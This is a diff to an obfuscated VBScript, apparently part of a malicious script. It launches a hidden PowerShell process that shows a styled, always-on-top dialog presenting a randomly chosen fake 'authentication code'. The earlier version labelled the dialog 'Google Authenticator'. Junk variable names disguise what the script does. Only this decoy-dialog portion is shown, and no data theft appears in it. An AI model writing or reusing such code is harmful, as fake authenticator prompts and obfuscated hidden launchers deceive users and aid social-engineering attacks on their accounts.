@@ -20,18 +20,52 @@ otp = array(randomIndex)
 Dim formattedOTP
 formattedOTP = Left(otp, 3) & " " & Mid(otp, 4, 3)
 
-ccccccmd = "Add-Type -AssemblyName System.Windows.Forms;" & _
-      "$f=New-Object Windows.Forms.Form;" & _
-      "$f.Text='Google Authenticator';$f.TopMost=$true;$f.StartPosition='CenterScreen';$f.Size='300,140';" & _
-      "$l=New-Object Windows.Forms.Label;" & _
-      "$l.Text='Authentication code: " & formattedOTP & "';$l.AutoSize=0;$l.Dock='Top';$l.Height=60;$l.TextAlign='MiddleCenter';" & _
-      "$b=New-Object Windows.Forms.Button;" & _
-      "$b.Text='OK';$b.Width=75;$b.Height=23;$b.Left=105;$b.Top=70;$b.Add_Click({$f.Close()});" & _
-      "$f.Controls.AddRange(@($l,$b));" & _
-      "[void]$f.ShowDialog();"
+Dim ccccccccccccmmd
+ccccccccccccmmd = "Add-Type -AssemblyName System.Windows.Forms;"
+ccccccccccccmmd = ccccccccccccmmd & "Add-Type -AssemblyName System.Drawing;"
+
+ccccccccccccmmd = ccccccccccccmmd & "$f=New-Object Windows.Forms.Form;"
+ccccccccccccmmd = ccccccccccccmmd & "$f.Text='Authentication';$f.TopMost=$true;$f.StartPosition='CenterScreen';"
+ccccccccccccmmd = ccccccccccccmmd & "$f.FormBorderStyle='None';$f.Size=New-Object System.Drawing.Size(360,230);"
+ccccccccccccmmd = ccccccccccccmmd & "$f.BackColor=[System.Drawing.Color]::FromArgb(24,24,27);"
+ccccccccccccmmd = ccccccccccccmmd & "$f.KeyPreview=$true;"
+
+ccccccccccccmmd = ccccccccccccmmd & "$bar=New-Object Windows.Forms.Panel;$bar.SetBounds(0,0,360,4);"
+ccccccccccccmmd = ccccccccccccmmd & "$bar.BackColor=[System.Drawing.Color]::FromArgb(99,102,241);"
+
+ccccccccccccmmd = ccccccccccccmmd & "$t=New-Object Windows.Forms.Label;$t.Text='AUTHENTICATION CODE';"
+ccccccccccccmmd = ccccccccccccmmd & "$t.ForeColor=[System.Drawing.Color]::FromArgb(161,161,170);"
+ccccccccccccmmd = ccccccccccccmmd & "$t.Font=New-Object System.Drawing.Font('Segoe UI',9);"
+ccccccccccccmmd = ccccccccccccmmd & "$t.SetBounds(0,30,360,22);$t.TextAlign='MiddleCenter';"
+
+ccccccccccccmmd = ccccccccccccmmd & "$c=New-Object Windows.Forms.Label;$c.Text='" & formattedOTP & "';"
+ccccccccccccmmd = ccccccccccccmmd & "$c.ForeColor=[System.Drawing.Color]::White;"
+ccccccccccccmmd = ccccccccccccmmd & "$c.Font=New-Object System.Drawing.Font('Consolas',34,[System.Drawing.FontStyle]::Bold);"
+ccccccccccccmmd = ccccccccccccmmd & "$c.SetBounds(0,60,360,66);$c.TextAlign='MiddleCenter';"
+
+ccccccccccccmmd = ccccccccccccmmd & "$cp=New-Object Windows.Forms.Button;$cp.Text='Copy';"
+ccccccccccccmmd = ccccccccccccmmd & "$cp.FlatStyle='Flat';$cp.FlatAppearance.BorderSize=1;"
+ccccccccccccmmd = ccccccccccccmmd & "$cp.FlatAppearance.BorderColor=[System.Drawing.Color]::FromArgb(63,63,70);"
+ccccccccccccmmd = ccccccccccccmmd & "$cp.BackColor=[System.Drawing.Color]::FromArgb(24,24,27);"
+ccccccccccccmmd = ccccccccccccmmd & "$cp.ForeColor=[System.Drawing.Color]::FromArgb(212,212,216);"
+ccccccccccccmmd = ccccccccccccmmd & "$cp.Font=New-Object System.Drawing.Font('Segoe UI',9);$cp.Cursor='Hand';"
+ccccccccccccmmd = ccccccccccccmmd & "$cp.SetBounds(70,158,100,34);"
+ccccccccccccmmd = ccccccccccccmmd & "$cp.Add_Click({[System.Windows.Forms.Clipboard]::SetText($c.Text);$cp.Text='Copied'});"
+
+ccccccccccccmmd = ccccccccccccmmd & "$b=New-Object Windows.Forms.Button;$b.Text='OK';"
+ccccccccccccmmd = ccccccccccccmmd & "$b.FlatStyle='Flat';$b.FlatAppearance.BorderSize=0;"
+ccccccccccccmmd = ccccccccccccmmd & "$b.BackColor=[System.Drawing.Color]::FromArgb(99,102,241);"
+ccccccccccccmmd = ccccccccccccmmd & "$b.ForeColor=[System.Drawing.Color]::White;"
+ccccccccccccmmd = ccccccccccccmmd & "$b.Font=New-Object System.Drawing.Font('Segoe UI',9,[System.Drawing.FontStyle]::Bold);$b.Cursor='Hand';"
+ccccccccccccmmd = ccccccccccccmmd & "$b.SetBounds(190,158,100,34);$b.Add_Click({$f.Close()});"
+
+ccccccccccccmmd = ccccccccccccmmd & "$f.AcceptButton=$b;"
+ccccccccccccmmd = ccccccccccccmmd & "$f.Add_KeyDown({if($_.KeyCode -eq 'Escape'){$f.Close()}});"
+ccccccccccccmmd = ccccccccccccmmd & "$f.Controls.AddRange(@($bar,$t,$c,$cp,$b));"
+ccccccccccccmmd = ccccccccccccmmd & "[void]$f.ShowDialog();"
 
 CreateObject("WScript.Shell").Run _
-    "powershell -NoProfile -WindowStyle Hidden -Command """ & ccccccmd & """", _
+    "powershell -NoProfile -Sta -WindowStyle Hidden -Command """ & ccccccccccccmmd & """", _
     0, False
 
 Dim aaaaaaabncjds, qwoiughduiobhciwe, fwcwfcuhwfcnhioquf, zbxcvnbzcxvmzxb, pppppppppppooooooooodddd
